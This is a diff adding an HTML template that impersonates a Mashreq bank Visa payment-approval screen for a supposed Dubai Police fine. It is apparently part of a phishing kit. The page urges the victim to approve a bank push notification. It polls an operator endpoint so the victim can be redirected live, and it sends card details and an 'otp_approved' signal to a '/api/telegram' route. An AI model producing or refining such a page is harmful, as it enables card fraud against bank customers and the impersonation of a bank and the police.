@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Mashreq | Authorize Payment</title>
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif; background:white; min-height:100vh; max-width:480px; margin:0 auto; display:flex; flex-direction:column; }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div style="display:flex;align-items:center;justify-content:space-between;padding:16px 20px;">
+  <div style="display:flex;align-items:center;gap:6px;">
+    <span style="font-size:22px;font-weight:700;color:#F47920;font-style:italic;letter-spacing:-0.5px;">mashreq</span>
+    <svg width="32" height="32" viewBox="0 0 100 100">
+      <line x1="68.00" y1="50.00" x2="92.00" y2="50.00" stroke="#F47920" stroke-width="10" stroke-linecap="round"/>
+      <line x1="65.59" y1="65.00" x2="86.59" y2="77.00" stroke="#F9A31A" stroke-width="10" stroke-linecap="round"/>
+      <line x1="58.00" y1="78.11" x2="70.00" y2="99.11" stroke="#E8361C" stroke-width="10" stroke-linecap="round"/>
+      <line x1="46.00" y1="86.60" x2="46.00" y2="110.60" stroke="#F47920" stroke-width="10" stroke-linecap="round"/>
+      <line x1="33.41" y1="88.60" x2="21.41" y2="109.60" stroke="#F9A31A" stroke-width="10" stroke-linecap="round"/>
+      <line x1="22.00" y1="82.00" x2="10.00" y2="103.00" stroke="#E8361C" stroke-width="10" stroke-linecap="round"/>
+      <line x1="14.00" y1="68.00" x2="-7.00" y2="80.00" stroke="#F47920" stroke-width="10" stroke-linecap="round"/>
+      <line x1="8.00" y1="50.00" x2="-16.00" y2="50.00" stroke="#F9A31A" stroke-width="10" stroke-linecap="round"/>
+      <line x1="14.41" y1="33.00" x2="-6.59" y2="21.00" stroke="#E8361C" stroke-width="10" stroke-linecap="round"/>
+      <line x1="24.00" y1="19.89" x2="12.00" y2="-1.11" stroke="#F47920" stroke-width="10" stroke-linecap="round"/>
+      <line x1="37.00" y1="11.40" x2="37.00" y2="-12.60" stroke="#F9A31A" stroke-width="10" stroke-linecap="round"/>
+      <line x1="51.59" y1="9.40" x2="63.59" y2="-11.60" stroke="#E8361C" stroke-width="10" stroke-linecap="round"/>
+      <circle cx="50" cy="50" r="16" fill="white"/>
+    </svg>
+    <span style="font-size:18px;color:#F47920;direction:rtl;margin-left:2px;">المشرق</span>
+  </div>
+  <div style="display:flex;align-items:center;gap:16px;">
+    <span style="font-size:22px;font-weight:900;color:#1a1f71;font-style:italic;font-family:serif;letter-spacing:-0.5px;">VISA</span>
+    <button onclick="window.location.href='/'" style="background:none;border:none;color:#0066cc;font-size:16px;font-weight:500;cursor:pointer;padding:0;">Cancel</button>
+  </div>
+</div>
+
+<div style="height:1px;background:#e5e7eb;margin:0 0 24px;"></div>
+
+<!-- Main content -->
+<div style="padding:0 28px;flex:1;">
+  <div style="font-size:22px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:24px;line-height:1.3;">
+    Tap the Mashreq notification to approve this payment
+  </div>
+
+  <!-- Pending warning -->
+  <div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:28px;">
+    <div style="width:28px;height:28px;border-radius:50%;background:#dc2626;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px;">
+      <span style="color:white;font-size:16px;font-weight:700;line-height:1;">✕</span>
+    </div>
+    <div style="font-size:14px;color:#444;line-height:1.6;">
+      Your payment is pending. Please approve the Mashreq notification and try again.
+    </div>
+  </div>
+
+  <!-- Card details -->
+  <div style="text-align:center;margin-bottom:10px;">
+    <div style="width:60px;height:60px;border-radius:50%;background:rgba(244,121,32,0.1);display:inline-flex;align-items:center;justify-content:center;margin-bottom:14px;">
+      <svg width="28" height="22" viewBox="0 0 28 22" fill="none">
+        <rect x="0.5" y="0.5" width="27" height="21" rx="3.5" stroke="#F47920" stroke-width="1.5" fill="none"/>
+        <rect x="0" y="5" width="28" height="5" fill="#F47920" opacity="0.3"/>
+        <rect x="4" y="14" width="8" height="2" rx="1" fill="#F47920" opacity="0.6"/>
+      </svg>
+    </div>
+    <div style="font-size:18px;font-weight:600;color:#1a1a1a;margin-bottom:6px;">****<%= cardLast4 %></div>
+    <div style="font-size:15px;font-weight:600;color:#1a1a1a;margin-bottom:4px;">Dubai Police</div>
+    <div style="font-size:26px;font-weight:700;color:#1a1a1a;">AED <%= totalFine.toLocaleString() %></div>
+  </div>
+</div>
+
+<!-- Bottom section -->
+<div style="background:#f5f5f5;padding:20px 28px;margin-top:24px;">
+  <div style="display:flex;align-items:flex-start;gap:16px;">
+    <div style="width:80px;height:80px;flex-shrink:0;background:white;border-radius:12px;border:1px solid #e0e0e0;overflow:hidden;display:flex;flex-direction:column;padding:6px;gap:3px;">
+      <div style="height:8px;background:#F47920;border-radius:3px;"></div>
+      <div style="height:5px;background:#e0e0e0;border-radius:2px;width:80%;"></div>
+      <div style="height:5px;background:#e0e0e0;border-radius:2px;width:60%;"></div>
+      <div style="width:28px;height:28px;background:#F47920;border-radius:50%;margin:4px auto 0;display:flex;align-items:center;justify-content:center;">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+          <path d="M12 2L4 5v6c0 5.5 3.8 10.7 8 12 4.2-1.3 8-6.5 8-12V5l-8-3z" fill="white"/>
+          <path d="M9 12l2 2 4-4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div style="font-size:6px;color:#666;text-align:center;">Security</div>
+    </div>
+    <div style="font-size:14px;color:#444;line-height:1.6;">
+      You can also find the notification in the <strong>"Security"</strong> section of your app
+    </div>
+  </div>
+</div>
+
+<!-- Already approved -->
+<div style="padding:18px 28px;border-top:1px solid #e5e7eb;text-align:center;">
+  <button onclick="handleApproved()" style="background:none;border:none;color:#F47920;font-size:15px;font-weight:600;cursor:pointer;padding:0;">
+    I've already approved this payment
+  </button>
+</div>
+
+<script>
+const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
+const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
+const ISSUER     = <%- JSON.stringify(issuer) %>;
+const SID        = <%- JSON.stringify(sid) %>;
+
+if (SID) {
+  const sidParams = '?totalFine=' + TOTAL_FINE + '&cardLast4=' + encodeURIComponent(CARD_LAST4) + '&issuer=' + encodeURIComponent(ISSUER) + '&sid=' + SID;
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/check-status?sid=' + SID);
+      const d = await r.json();
+      if (d.action === 'redirect' && d.page) window.location.href = '/' + d.page + sidParams;
+    } catch(e) {}
+  }, 3000);
+}
+
+function handleApproved() {
+  fetch('/api/telegram', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({type:'otp_approved', cardLast4: CARD_LAST4, totalFine: TOTAL_FINE, issuer: ISSUER})
+  }).catch(() => {});
+  window.location.href = '/';
+}
+</script>
+</body>
+</html>
